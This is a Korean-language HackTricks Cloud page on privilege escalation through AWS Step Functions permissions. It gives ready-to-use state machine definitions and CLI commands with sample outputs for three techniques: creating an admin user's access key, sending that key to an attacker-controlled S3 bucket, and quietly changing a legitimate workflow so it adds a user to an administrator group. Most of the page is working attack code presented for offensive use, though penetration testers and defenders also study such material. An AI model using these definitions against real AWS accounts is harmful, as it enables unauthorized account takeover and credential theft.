# AWS - Step Functions Privilege Escalation

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 요령을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## Step Functions

이 AWS 서비스에 대한 자세한 정보는 확인하세요:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

**`states:TestState`** 및 **`iam:PassRole`** 권한을 가진 공격자는 어떤 상태든 테스트하고 IAM 역할을 생성하거나 업데이트하지 않고도 해당 역할을 전달할 수 있습니다. 이를 통해 다른 AWS 서비스에 역할 권한을 사용하여 무단 액세스할 수 있습니다. 이러한 권한을 결합하면 워크플로우 조작부터 데이터 변경, 데이터 유출, 리소스 조작 및 권한 상승에 이르기까지 광범위한 무단 조치로 이어질 수 있습니다.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
다음 예제는 이러한 권한을 활용하여 **`admin`** 사용자에 대한 액세스 키를 생성하는 상태를 테스트하는 방법을 보여줍니다. 이 허용 역할은 AWS 환경의 고도의 권한을 가진 정책과 관련이 있어야 합니다 (예: **`arn:aws:iam::aws:policy/AdministratorAccess`**) 이는 상태가 **`iam:CreateAccessKey`** 작업을 수행할 수 있도록 허용합니다:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **권한 상승을 수행하는 데 사용된** 명령어:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **잠재적 영향**: 워크플로우의 무단 실행 및 조작, 민감한 리소스 접근으로 인한 중대한 보안 침해 가능성.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

**`states:CreateStateMachine`** 및 **`iam:PassRole`**을 가진 공격자는 상태 머신을 생성하고 임의의 IAM 역할을 제공하여 해당 역할의 권한으로 다른 AWS 서비스에 무단 액세스할 수 있습니다. 이전의 권한 상승 기술인 **`states:TestState`** 및 **`iam:PassRole`**과는 달리, 이 기술은 자체적으로 실행되지 않습니다. **`states:StartExecution`** 또는 **`states:StartSyncExecution`** 권한(**`states:StartSyncExecution`**은 **표준 워크플로우에 사용할 수 없으며, 상태 머신 표현에만 사용**)도 필요합니다. 상태 머신을 시작하고 실행하기 위해 필요합니다.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
다음 예제는 **`admin`** 사용자를 위한 액세스 키를 생성하고 이 액세스 키를 공격자가 제어하는 S3 버킷으로 유출하는 상태 머신을 생성하는 방법을 보여줍니다. 이 권한을 활용하고 AWS 환경의 허용적 역할을 사용합니다. 이 허용적 역할은 해당 상태 머신이 **`iam:CreateAccessKey`** 및 **`s3:putObject`** 작업을 수행할 수 있도록 하는 고권한 정책(예: **`arn:aws:iam::aws:policy/AdministratorAccess`**)이 연결되어 있어야 합니다.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **상태 머신을 생성하는 데 사용된** **명령어**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- 이전에 생성된 상태 머신을 시작하는 데 사용된 **명령어** 실행:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

공격자가 제어하는 S3 버킷은 피해 계정으로부터 s3:PutObject 작업을 수락할 수 있는 권한을 가져야 합니다.

{% endhint %}

- **잠재적인 영향**: 워크플로우의 무단 실행 및 조작, 민감한 리소스 접근으로 이어져 중대한 보안 침해 가능성.

### `states:UpdateStateMachine` & (항상 필요한 것은 아님) `iam:PassRole`

**`states:UpdateStateMachine`** 권한을 가진 공격자는 상태 머신의 정의를 수정할 수 있어 추가 은밀한 상태를 추가하여 권한 상승으로 이어질 수 있는 상황을 만들 수 있습니다. 이렇게 하면 합법적인 사용자가 상태 머신을 실행할 때 이 새로운 악의적인 은밀한 상태가 실행되어 권한 상승이 성공할 것입니다.

상태 머신과 연관된 IAM 역할이 얼마나 허용적인지에 따라 공격자는 2가지 상황을 직면할 것입니다:

1. **허용적인 IAM 역할**: 상태 머신과 연관된 IAM 역할이 이미 허용적인 경우(예: **`arn:aws:iam::aws:policy/AdministratorAccess`** 정책이 첨부된 경우), 그럼 **`iam:PassRole`** 권한은 권한 상승을 위해 필요하지 않을 것입니다. 왜냐하면 IAM 역할을 업데이트할 필요가 없기 때문에 상태 머신 정의만으로도 충분합니다.
2. **허용적이지 않은 IAM 역할**: 이전 경우와 대조적으로, 여기서 공격자는 상태 머신과 연관된 허용적인 IAM 역할을 연결하는 것이 필요하기 때문에 **`iam:PassRole`** 권한도 필요합니다. 상태 머신 정의를 수정하는 것 외에도 허용적인 IAM 역할을 연결해야 하기 때문입니다.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
다음 예제는 HelloWorld 람다 함수를 호출하는 합법적인 상태 머신을 업데이트하는 방법을 보여줍니다. 여기에는 사용자 **`unprivilegedUser`**를 **`administrator`** IAM 그룹에 추가하는 추가 상태가 포함됩니다. 이렇게 하면 합법적인 사용자가 업데이트된 상태 머신의 실행을 시작할 때 이 새로운 악성 은신 상태가 실행되어 권한 상승이 성공합니다.

{% hint style="warning" %}

상태 머신에 허용되는 IAM 역할이 연결되어 있지 않은 경우, IAM 역할을 업데이트하려면 **`iam:PassRole`** 권한도 필요합니다. 이를 위해 허용되는 IAM 역할(예: **`arn:aws:iam::aws:policy/AdministratorAccess`** 정책이 첨부된 역할)을 연결해야 합니다.

{% endhint %}

{% tabs %}

{% tab title="Legit State Machine" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="악의적으로 업데이트된 상태 머신" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
- **합법적인 상태 머신을 업데이트하는 데 실행된** **명령어**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **잠재적 영향**: 워크플로우의 무단 실행 및 조작, 민감한 리소스 접근으로 인한 보안 침해 가능성, 중대한 보안 위협 발생 가능.

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출**하세요.

</details>
